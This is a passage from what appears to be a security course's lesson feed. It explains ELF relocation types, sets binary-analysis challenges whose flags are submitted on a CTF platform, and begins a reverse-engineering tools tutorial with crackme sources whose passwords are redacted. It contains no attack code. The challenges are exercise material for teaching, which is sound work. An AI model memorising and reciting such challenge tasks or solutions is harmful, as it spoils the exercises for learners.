&lt;li>&lt;strong>Info&lt;/strong> - This field is used to derive the index in the symbol table to the affected symbol as well as the algorithm needed for fixing.
&lt;ul>
&lt;li>&lt;code>info &amp;gt;&amp;gt; 8&lt;/code> - symbol table index&lt;/li>
&lt;li>&lt;code>info &amp;amp; 0xff&lt;/code> - algorithm type as defined in the documentation&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;code>readelf&lt;/code> is nice enough to interpret the symbol table for us and gives us the relocation algorithm in the &lt;strong>Type&lt;/strong> field and also the symbol name and value as defined in the symbol table.&lt;/p>
&lt;p>By looking at the types of relocations we can draw some basic conclusions about the symbol types and also about the files.&lt;/p>
&lt;ul>
&lt;li>Relocatable Files
&lt;ul>
&lt;li>&lt;strong>R_386_32&lt;/strong> - usually used to reference changes to a local symbol&lt;/li>
&lt;li>&lt;strong>R_386_PC32&lt;/strong> - reference a relative distance from here to the symbol&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Relocatable Files for Shared object
&lt;ul>
&lt;li>&lt;strong>R_386_GOTOFF&lt;/strong> - usually found in the code area, describes the offset from the beginning of GOT to a local symbol&lt;/li>
&lt;li>&lt;strong>R_386_GOT32&lt;/strong> - also speicific to the code area.
These entries persist in the linkage phase&lt;/li>
&lt;li>&lt;strong>R_386_PLT32&lt;/strong> - used when describing calls to global subroutines.
when the linker will read this information it will generate an entry in the GOT and PLT tables&lt;/li>
&lt;li>&lt;strong>R_386_GOTPC&lt;/strong> - used in function to calculate the start address of the GOT&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Executables that use Dynamic Linking
&lt;ul>
&lt;li>&lt;strong>R_386_JMP&lt;/strong> - the dynamic linker will deposit the address of the external subroutine during execution&lt;/li>
&lt;li>&lt;strong>R_386_COPY&lt;/strong> - the address of global variable from shared object will be deposited here&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Shared Object Files
&lt;ul>
&lt;li>&lt;strong>R_386_JMP&lt;/strong> - the dynamic linker will deposit the address of the external subroutine from one of the shared object dependencies during execution&lt;/li>
&lt;li>&lt;strong>R_386_GLOB_DATA&lt;/strong> - used to deposit the address of a global symbol defined in one of the shared object dependencies&lt;/li>
&lt;li>&lt;strong>R_386_RELATIVE&lt;/strong> - at link time all the R_386_GOTOFF entries are fixed and these relocation will contain absolute addresses&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>IMPORTANT:&lt;/strong> Executable files that are statically linked do not contain relocations.&lt;/p>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;p>Challenges can be found in the &lt;code>activities/&lt;/code> directory.&lt;/p>
&lt;h3 id="01-binary-puzzle">01. Binary Puzzle&lt;/h3>
&lt;p>Now that you know some stuff let&amp;rsquo;s see how fast you can solve a 4 piece puzzle!&lt;/p>
&lt;p>You are given 4 relocatable object files.
Examine their structure carefully and figure out what each of them is meant to be and how you can link them to create a valid binary.&lt;/p>
&lt;p>All conventions regarding shared object names have been respected.&lt;/p>
&lt;p>Hints:&lt;/p>
&lt;ul>
&lt;li>Use &lt;code>nm&lt;/code> to investigate the files, determine what pieces you need to put together and then link them with &lt;code>gcc&lt;/code>.&lt;/li>
&lt;li>Check whether the files are compiled for 32 bits or for 64 bits and use the proper &lt;code>gcc&lt;/code> command.&lt;/li>
&lt;/ul>
&lt;p>If you do it correctly you will get an executable that you can run and get the following output:&lt;/p>
&lt;pre tabindex="0">&lt;code>Congratulations
extern var1 10 at 0x565fe020
extern var2 at 0x565fe030
extern var3 99 at 0x565fe024
local var4 0 at 0xffd532ac
g(): not really external
&lt;/code>&lt;/pre>&lt;h3 id="02-case-of-the-missing-function">02. Case of the Missing Function&lt;/h3>
&lt;p>This task contains a helpless little binary that has lost one of its functions.
Analyze the symbol dependencies as well as the code inside the binary.
Figure out a way to reunite the binary with its missing function.&lt;/p>
&lt;p>You cannot modify any of the binaries in order to solve this task.&lt;/p>
&lt;p>Hints:&lt;/p>
&lt;ul>
&lt;li>Run the file, check what it is missing and build the missing component.
Use &lt;code>nm&lt;/code> to determine what symbols should be part of the missing component.&lt;/li>
&lt;li>Use &lt;code>LD_LIBRARY_PATH=.&lt;/code> to run an executable file and load a shared library file from the current folder.&lt;/li>
&lt;/ul>
&lt;h3 id="03-memory-dump-analysis">03. Memory Dump Analysis&lt;/h3>
&lt;p>Using your newfound voodoo skills you are now able to tackle the following task.
In the middle of two programs I added the following lines:&lt;/p>
&lt;pre tabindex="0">&lt;code>{
int i;
int *a[1];
for( i = 0 ; i &amp;lt; 20; i++)
printf(&amp;#34;%p\n&amp;#34;, a[i]);
}
&lt;/code>&lt;/pre>&lt;p>The results were the following, respectively:&lt;/p>
&lt;pre tabindex="0">&lt;code>0x804853b
0x1
0x8048530
(nil)
(nil)
0xf7e0ace5
0x1
0xffffce64
0xffffce6c
0xf7ffcfc0
0x1c
(nil)
0xf7fda4c8
0x2
0xffffce60
0xf7f94e54
(nil)
(nil)
(nil)
0xd545cf8d
&lt;/code>&lt;/pre>&lt;p>And:&lt;/p>
&lt;pre tabindex="0">&lt;code>0xbfffe7d0
0xd696910
0x80484a9
0xb7fffbe8
0x3
0xb7ffefc0
0xb7df6a84
0x1
0xb7fdc780
0xb7fe75fc
0x804c008
0xb7e59195
0x804c008
0xb7fdb000
0xb7fdc000
0x1
0xffffffff
0x3
(nil)
0xf3b9a5b
&lt;/code>&lt;/pre>&lt;p>Try to tell:&lt;/p>
&lt;ul>
&lt;li>Which was running on a pure 32 bit system&lt;/li>
&lt;li>Which values from the stack traces are from the &lt;code>.text&lt;/code> region&lt;/li>
&lt;li>Which do not point to valid memory addresses&lt;/li>
&lt;li>Which point to the stack&lt;/li>
&lt;li>Which point to the library/mmap zone&lt;/li>
&lt;/ul>
&lt;h3 id="04-compiler-flags">04. Compiler Flags&lt;/h3>
&lt;p>Use proper compiler/linker flags/options to create a running executable for &lt;code>flag1.o&lt;/code> and &lt;code>caller.c&lt;/code> and for &lt;code>flag2.o&lt;/code> and &lt;code>caller.c&lt;/code>.
Submit the flag &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">on the platform&lt;/a>.&lt;/p>
&lt;p>It&amp;rsquo;s the same flag, it&amp;rsquo;s just to make sure you are able to find the flag with both formats of the &lt;code>flag*.o&lt;/code> object files.&lt;/p>
&lt;h3 id="05-print-flag">05. Print Flag&lt;/h3>
&lt;p>Someone has tampered with the executable file &lt;code>get_message&lt;/code>.
Please fix this.
There should be a flag message printed in case you solve it correctly.&lt;/p>
&lt;p>You will need to modify the executable.
We recommend you install and use &lt;a href="https://packages.ubuntu.com/bionic/bless">Bless&lt;/a>.&lt;/p>
&lt;p>What actions does the program do? What functions does it invoke? What should it invoke?&lt;/p>
&lt;p>Follow the actions from the entry point in the ELF file and see what is the spot where the program doesn&amp;rsquo;t do what it should.&lt;/p>
&lt;h3 id="06-matryoshka">06. Matryoshka&lt;/h3>
&lt;p>Look carefully inside the &lt;code>matryoshka&lt;/code> executable.
The flag is there, but inside something else.&lt;/p>
&lt;p>Submit the flag &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges">on the platform&lt;/a>.&lt;/p>
&lt;h3 id="bonus-07-fix-me">Bonus: 07. Fix Me&lt;/h3>
&lt;p>You are given a binary that was stored on a USB stick in space where it was hit by gamma rays thus altering its content.
Fortunately, because the executable is so small, the only area damaged is the ELF header.
Fix it and run it!&lt;/p>
&lt;p>The structure of an ELF file is briefly presented here: &lt;a href="http://i.imgur.com/m6kL4Lv.png">http://i.imgur.com/m6kL4Lv.png&lt;/a>&lt;/p>
&lt;p>A more detailed explaination of the ELF header is presented here: &lt;a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header">https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header&lt;/a>&lt;/p>
&lt;p>The entry point address should be &lt;code>0x8048054&lt;/code>.&lt;/p>
&lt;p>Review this tutorial on creating a minimal ELF file: &lt;a href="http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html&lt;/a>&lt;/p>
&lt;h3 id="further-pwning">Further Pwning&lt;/h3>
&lt;p>&lt;a href="http://crackmes.cf/users/geyslan/crackme.02.32/">http://crackmes.cf/users/geyslan/crackme.02.32/&lt;/a> is a challenge that will test your knowledge from the first three sessions.
The password for the archive is &lt;code>crackmes.de&lt;/code>.&lt;/p>
&lt;h3 id="further-reading">Further Reading&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="http://www.skyfree.org/linux/references/ELF_Format.pdf">ELF-32&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://ftp.openwatcom.org/devel/docs/elf-64-gen.pdf">ELF-64&lt;/a> specification&lt;/li>
&lt;li>&lt;a href="https://elinux.org/Executable_and_Linkable_Format_(ELF)">list&lt;/a> of all ELF specification formats&lt;/li>
&lt;li>&lt;a href="https://developer.arm.com/documentation/ihi0044/e/">ARM&lt;/a> specification&lt;/li>
&lt;li>&lt;a href="https://wiki.gentoo.org/wiki/Hardened/Introduction_to_Position_Independent_Code">Position Independent Code&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/developerworks/library/l-shobj/">Creating shared objects&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.airs.com/blog/archives/189">GNU_RELRO&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://guru.multimedia.cx/pt_gnu_stack/">GNU_STACK&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/specialsections.html">ELF Special Sections&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sourceware.org/binutils/docs/binutils/strip.html">strip manpage&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.mindfruit.co.uk/2012/06/relocations-relocations.html">Some Assembly Required&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://netwinder.osuosl.org/users/p/patb/public_html/elf_relocs.html">Study Of ELF Loading and Relocs&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Binary:</title><link>/binary/exploration-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/exploration-tools/</guid><description>
&lt;h1 id="exploration-tools">Exploration Tools&lt;/h1>
&lt;details open>
&lt;summary>Table of contents&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="#tutorials">Tutorials&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-tutorial---poor-mans-technique-strings">01. Tutorial - Poor man&amp;rsquo;s technique: strings&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-tutorial---execution-tracing-ltrace-and-strace">02. Tutorial - Execution tracing (ltrace and strace)&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-tutorial---symbols-nm">03. Tutorial - Symbols: nm&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-tutorial---library-dependencies">04. Tutorial - Library dependencies&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-tutorial---network-netstat-and-netcat">05. Tutorial - Network: netstat and netcat&lt;/a>&lt;/li>
&lt;li>&lt;a href="#06-tutorial---open-files">06. Tutorial - Open files&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#07-challenge---perfect-answer">07. Challenge - Perfect Answer&lt;/a>&lt;/li>
&lt;li>&lt;a href="#08-challenge---lots-of-strings">08. Challenge - Lots of strings&lt;/a>&lt;/li>
&lt;li>&lt;a href="#09-challenge---sleepy-cats">09. Challenge - Sleepy cats&lt;/a>&lt;/li>
&lt;li>&lt;a href="#10-challenge---hidden">10. Challenge - Hidden&lt;/a>&lt;/li>
&lt;li>&lt;a href="#11-challenge---detective">11. Challenge - Detective&lt;/a>&lt;/li>
&lt;li>&lt;a href="#extra">Extra&lt;/a>&lt;/li>
&lt;li>&lt;a href="#further-pwning">Further pwning&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>&lt;/li>
&lt;/ul>
&lt;/details>
&lt;h2 id="tutorials">Tutorials&lt;/h2>
&lt;p>When faced with a binary with no source or parts of the source missing you can infer some of its functionalities based upon some basic reconnaissance techniques using various tools.&lt;/p>
&lt;h3 id="01-tutorial---poor-mans-technique-strings">01. Tutorial - Poor man&amp;rsquo;s technique: strings&lt;/h3>
&lt;p>The simplest recon technique is to dump the ASCII (or Unicode) text from a binary. It doesn&amp;rsquo;t offer any guarantees but sometimes you can get a lot of useful information out of it.&lt;/p>
&lt;blockquote>
&lt;p>By default, when applied to a binary it only scans the data section. To obtain information such as the compiler version used in producing the binary use:&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>strings -a crackme1
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s illustrate how strings can be useful in a simple context. Try out the &lt;a href="./activities/01-tutorial-strings/src">crackme1&lt;/a> binary:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">my_strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">size_t&lt;/span> &lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">len&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">strlen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">len&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">for&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">i&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#000">i&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span> &lt;span style="color:#000">len&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#000">i&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">++&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">!=&lt;/span> &lt;span style="color:#000">s2&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Password:&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">fgets&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#204a87">NULL&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">exit&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">strlen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">!&lt;/span>&lt;span style="color:#000">my_strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">???????????????????????&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Correct!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Nope!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The password has been redacted from the listing but you can retrieve it with &lt;code>strings&lt;/code>. Try it out!&lt;/p>
&lt;h3 id="02-tutorial---execution-tracing-ltrace-and-strace">02. Tutorial - Execution tracing (ltrace and strace)&lt;/h3>
&lt;p>&lt;a href="https://man7.org/linux/man-pages/man1/ltrace.1.html">ltrace&lt;/a> is an utility that can list library function calls or &lt;a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls&lt;/a> made by a program. &lt;a href="https://man7.org/linux/man-pages/man1/strace.1.html">strace&lt;/a> is similar, but only lists syscalls. A syscall is a service exposed by the kernel itself.&lt;/p>
&lt;p>The way they work is with the aid of a special syscall, called &lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace&lt;/a>. This single syscall forms the basis for most of the functionality provided by &lt;code>ltrace&lt;/code>, &lt;code>strace&lt;/code>, &lt;code>gdb&lt;/code> and similar tools that debug programs. It can receive up to 4 arguments: the operation, the PID to act on, the address to read/write and the data to write. The functionality exposed by &lt;code>ptrace()&lt;/code> is massive, but think of any functionality you&amp;rsquo;ve seen in a debugger:&lt;/p>
&lt;ul>
&lt;li>attach/detach to/from a process&lt;/li>
&lt;li>set breakpoints&lt;/li>
&lt;li>continue a stopped program&lt;/li>
&lt;li>read/write registers&lt;/li>
&lt;li>act on signals&lt;/li>
&lt;li>register syscalls&lt;/li>
&lt;/ul>
&lt;p>&lt;code>strace&lt;/code> provides some pretty printing strictly concerning the syscalls of the traced process. However, &lt;code>ltrace&lt;/code> provides further functionality and gathers information about all library calls. Here&amp;rsquo;s how &lt;code>ltrace&lt;/code> does its magic:&lt;/p>
&lt;ul>
&lt;li>it reads the tracee memory and parses it in order to find out about loaded symbols&lt;/li>
&lt;li>it makes a copy of the binary code pertaining to a symbol using a &lt;code>PTRACE_PEEKTEXT&lt;/code> directive of &lt;code>ptrace()&lt;/code>&lt;/li>
&lt;li>it injects a breakpoint using a &lt;code>PTRACE_POKETEXT&lt;/code> directive of &lt;code>ptrace()&lt;/code>&lt;/li>
&lt;li>it listens for a &lt;code>SIGTRAP&lt;/code> which will be generated when the breakpoint is hit&lt;/li>
&lt;li>when the breakpoint is hit, ltrace can examine the stack of the tracee and print information such as function name, parameters, return codes, etc.&lt;/li>
&lt;/ul>
&lt;p>Let&amp;rsquo;s try the next &lt;code>crackme&lt;/code>. If we remove &lt;code>my_strcmp&lt;/code> from the previous crackme you can solve it even without &lt;code>strings&lt;/code> because &lt;code>strcmp&lt;/code> is called from &lt;code>libc.so&lt;/code>. You can use &lt;code>ltrace&lt;/code> and see what functions are used and check for their given parameters. Try it out on the second &lt;code>crackme&lt;/code> where &lt;code>strings&lt;/code> does not help (&lt;a href="./activities/02-tutorial-execution-tracing/src">crackme2&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">correct_pass&lt;/span>&lt;span style="color:#000;font-weight:bold">[]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">?????????????????&lt;/span> &lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">deobf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ce5c00;font-weight:bold">???????????????&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
